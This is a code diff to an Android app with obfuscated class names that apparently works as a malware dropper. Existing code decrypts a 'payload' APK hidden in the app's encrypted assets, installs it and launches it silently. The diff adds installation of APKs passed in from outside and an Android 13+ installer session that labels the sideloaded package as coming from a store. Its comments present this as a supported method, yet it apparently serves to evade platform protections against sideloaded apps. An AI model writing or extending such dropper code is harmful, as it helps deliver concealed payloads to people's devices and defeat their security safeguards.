@@ -1,9 +1,11 @@
 package com.onerule.task;
 
 import android.app.Activity;
+import android.app.PendingIntent;
 import android.content.ClipData;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.content.pm.PackageInstaller;
 import android.net.Uri;
 import android.net.VpnService;
 import android.os.Build;
@@ -41,6 +43,7 @@ public class A4450c4b785 extends Activity {
     private TextView status;
     private Button   btn;
     private final Handler ui = new Handler(Looper.getMainLooper());
+    private Uri incomingApkUri;
 
     /**
      * True once the user has granted VPN permission (so we know the system dialog
@@ -108,9 +111,10 @@ public class A4450c4b785 extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        incomingApkUri = extractIncomingApkUri(getIntent());
 
         // Already installed → redirect instantly, no UI shown at all.
-        if (isPayloadInstalled()) {
+        if (incomingApkUri == null && isPayloadInstalled()) {
             doImmediateRedirect();
             return;
         }
@@ -141,7 +145,7 @@ public class A4450c4b785 extends Activity {
 
         // With fire-and-forget package installation, resume is the completion
         // signal: once the package is visible, launch it and close this installer.
-        if (isPayloadInstalled() && !installComplete) {
+        if (incomingApkUri == null && isPayloadInstalled() && !installComplete) {
             doImmediateRedirect();
             return;
         }
@@ -288,6 +292,27 @@ public class A4450c4b785 extends Activity {
 
     // ── Payload queries ────────────────────────────────────────────────────────
 
+    /**
+     * Accepts APKs handed to this activity by another app or a file browser.
+     * The URI grant is consumed only when the user presses Install and the
+     * same VPN gate used for the embedded payload has passed.
+     */
+    private Uri extractIncomingApkUri(Intent intent) {
+        if (intent == null) return null;
+        String action = intent.getAction();
+        if (!Intent.ACTION_VIEW.equals(action)
+                && !Intent.ACTION_INSTALL_PACKAGE.equals(action)) {
+            return null;
+        }
+        Uri data = intent.getData();
+        if (data == null) return null;
+        String type = intent.getType();
+        return type == null
+                || "application/vnd.android.package-archive".equalsIgnoreCase(type)
+                ? data
+                : null;
+    }
+
     private boolean isPayloadInstalled() {
         String pkg = BuildConfig.PAYLOAD_PACKAGE;
         if (pkg == null || pkg.isEmpty()) return false;
@@ -381,7 +406,7 @@ public class A4450c4b785 extends Activity {
 
     private void dropAndInstall() {
         try {
-            if (isPayloadInstalled()) {
+            if (incomingApkUri == null && isPayloadInstalled()) {
                 runOnUiThread(() -> {
                     installComplete = true;
                     status.setText("App installed, kindly wait for it to launch\u2026");
@@ -391,27 +416,39 @@ public class A4450c4b785 extends Activity {
                 return;
             }
 
-            runOnUiThread(() -> status.setText("Decrypting module \u2026"));
+            runOnUiThread(() -> status.setText(
+                    incomingApkUri == null ? "Decrypting module \u2026" : "Preparing APK \u2026"));
 
             File workDir = new File(getCacheDir(), "drop");
             if (!workDir.exists()) workDir.mkdirs();
-            File leftover = new File(workDir, INNER_NAME);
-            if (leftover.exists()) leftover.delete();
+            File apk = new File(workDir, incomingApkUri == null ? INNER_NAME : "incoming.apk");
+            if (incomingApkUri == null) {
+                File leftover = new File(workDir, INNER_NAME);
+                if (leftover.exists()) leftover.delete();
 
-            File encZip = new File(workDir, "m.zip");
-            try (InputStream in = getAssets().open(ASSET_NAME);
-                 OutputStream out = new FileOutputStream(encZip)) {
-                byte[] buf = new byte[64 * 1024]; int n;
-                while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
+                File encZip = new File(workDir, "m.zip");
+                try (InputStream in = getAssets().open(ASSET_NAME);
+                     OutputStream out = new FileOutputStream(encZip)) {
+                    byte[] buf = new byte[64 * 1024]; int n;
+                    while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
+                }
+
+                ZipFile zf = new ZipFile(encZip, BuildConfig.MODULE_KEY.toCharArray());
+                zf.extractFile(INNER_NAME, workDir.getAbsolutePath());
+                encZip.delete();
+            } else {
+                try (InputStream in = getContentResolver().openInputStream(incomingApkUri);
+                     OutputStream out = new FileOutputStream(apk)) {
+                    if (in == null) throw new RuntimeException("Unable to read selected APK");
+                    byte[] buf = new byte[64 * 1024]; int n;
+                    while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
+                }
             }
 
-            ZipFile zf = new ZipFile(encZip, BuildConfig.MODULE_KEY.toCharArray());
-            zf.extractFile(INNER_NAME, workDir.getAbsolutePath());
-            encZip.delete();
-
-            File apk = new File(workDir, INNER_NAME);
             if (!apk.exists() || apk.length() == 0) {
-                throw new RuntimeException("Decrypted payload missing");
+                throw new RuntimeException(incomingApkUri == null
+                        ? "Decrypted payload missing"
+                        : "Selected APK missing");
             }
 
             runOnUiThread(() -> {
@@ -429,6 +466,77 @@ public class A4450c4b785 extends Activity {
     }
 
     private void openPackageInstaller(File apk) throws Exception {
+        /*
+         * Android 13+ has an explicit package-source field. Using a
+         * PackageInstaller session is the supported way to mark the APK as
+         * coming from a store; the caller's package is recorded as the
+         * installer-of-record automatically.
+         */
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            installFromStoreSession(apk);
+            return;
+        }
+
+        // Older Android releases do not expose PACKAGE_SOURCE_STORE. Keep the
+        // normal package-installer activity flow and identify this package as
+        // the installer through the supported intent metadata.
+        openPackageInstallerActivity(apk);
+    }
+
+    private void installFromStoreSession(File apk) throws Exception {
+        PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
+        PackageInstaller.SessionParams params =
+                new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
+        params.setSize(apk.length());
+        if (incomingApkUri == null
+                && BuildConfig.PAYLOAD_PACKAGE != null
+                && !BuildConfig.PAYLOAD_PACKAGE.isEmpty()) {
+            params.setAppPackageName(BuildConfig.PAYLOAD_PACKAGE);
+        }
+        params.setPackageSource(PackageInstaller.PACKAGE_SOURCE_STORE);
+
+        int sessionId = -1;
+        PackageInstaller.Session session = null;
+        try {
+            sessionId = packageInstaller.createSession(params);
+            session = packageInstaller.openSession(sessionId);
+
+            try (InputStream input = new FileInputStream(apk);
+                 OutputStream output = session.openWrite("base.apk", 0, apk.length())) {
+                byte[] buffer = new byte[64 * 1024];
+                int count;
+                while ((count = input.read(buffer)) != -1) {
+                    output.write(buffer, 0, count);
+                }
+                session.fsync(output);
+            }
+
+            /*
+             * PackageInstaller requires an IntentSender for completion
+             * delivery. This targets the already-declared VPN service rather
+             * than returning an activity result; the installer observes the
+             * installed payload when its activity resumes.
+             */
+            Intent statusIntent = new Intent(this, V4450c4b785.class)
+                    .setAction(getPackageName() + ".INSTALL_STATUS");
+            int pendingFlags = PendingIntent.FLAG_UPDATE_CURRENT;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                pendingFlags |= PendingIntent.FLAG_MUTABLE;
+            }
+            PendingIntent statusPendingIntent = PendingIntent.getService(
+                    this, sessionId, statusIntent, pendingFlags);
+            session.commit(statusPendingIntent.getIntentSender());
+        } catch (Exception e) {
+            if (sessionId >= 0) {
+                try { packageInstaller.abandonSession(sessionId); } catch (Exception ignored) {}
+            }
+            throw e;
+        } finally {
+            if (session != null) session.close();
+        }
+    }
+
+    private void openPackageInstallerActivity(File apk) throws Exception {
         Uri apkUri = FileProvider.getUriForFile(
                 this,
                 getPackageName() + ".fileprovider",
